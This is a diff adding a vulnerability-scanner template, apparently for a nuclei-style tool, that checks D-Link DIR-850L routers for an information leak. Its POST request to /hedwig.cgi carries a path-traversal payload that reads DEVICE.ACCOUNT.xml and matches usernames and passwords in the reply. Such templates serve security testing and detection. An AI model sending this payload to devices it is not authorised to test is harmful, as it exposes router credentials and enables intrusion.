@@ -1,0 +1,27 @@
+id: dlink-850L-info-leak
+name: Dlink Dir-850L Info Leak
+severity: info
+confidence: tentative
+description: Dlink Dir-850L Info Leak
+reference: https://xz.aliyun.com/t/2941
+tags:
+- dlink
+- vuln
+requests:
+- method: POST
+  path: /hedwig.cgi
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - </usrid>
+    - </password>
+  condition: and
+  headers:
+    Cookie: uid=R8tBjwtFc8
+    Content-Type: text/xml
+  body: '<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
+
+    '
